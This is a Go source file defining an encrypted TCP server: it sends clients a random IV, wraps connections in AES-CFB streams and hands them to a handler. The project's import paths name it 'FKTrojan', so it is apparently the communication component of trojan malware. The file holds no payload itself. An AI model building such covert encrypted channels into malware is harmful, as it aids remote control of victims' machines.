package connect

import (
	. "FKTrojan/flog"
	. "FKTrojan/stream_utils"
	"crypto/aes"
	"crypto/rand"
	"fmt"
	"net"
	"time"
)

type TcpServer struct {
	ServerType ServerType
	port       int
	listenIP   string
	handler    Handler
}

func init() {

}

func NewTcpServer(serverType ServerType, port int, handler Handler) *TcpServer {
	return &TcpServer{
		ServerType: serverType,
		port:       port,
		listenIP:   LISTEN_IP,
		handler:    handler,
	}
}

func (ts *TcpServer) Run() error {
	ln, err := net.Listen("tcp", fmt.Sprintf("%s:%d", ts.listenIP, ts.port))
	if err != nil {
		panic(err)
	}
	for {
		conn, err := ln.Accept()
		if err != nil {
			// handle error
			Flog.Printf("ln.Accept() error %v", err)
			continue
		}
		// a goroutine handles conn so that the loop can accept other connections
		go func() {
			t := time.Now()
			defer func() {
				Flog.Printf("connect %v : cost : %.3fs", conn.RemoteAddr(), time.Since(t).Seconds())
			}()
			defer conn.Close()
			key := GetCFBK()
			// If the key is unique for each ciphertext, then it's ok to use a zero
			// IV.
			var iv [aes.BlockSize]byte
			// 随机iv + 密码模式
			// 破解概率非常低
			rand.Read(iv[:])
			conn.Write(iv[:])
			sr, err := DecryptFromStream(conn, iv[:], key)
			if err != nil {
				Flog.Printf("DecryptFromStream return error %v", err)
				return
			}
			sw, err := EncryptToStream(conn, iv[:], key)
			if err != nil {
				Flog.Printf("EncryptToStream return error %v", err)
				return
			}
			err = ts.handler(sr, sw)
			if err != nil {
				Flog.Printf("handle error %v\n", err)
			}
		}()
	}
}
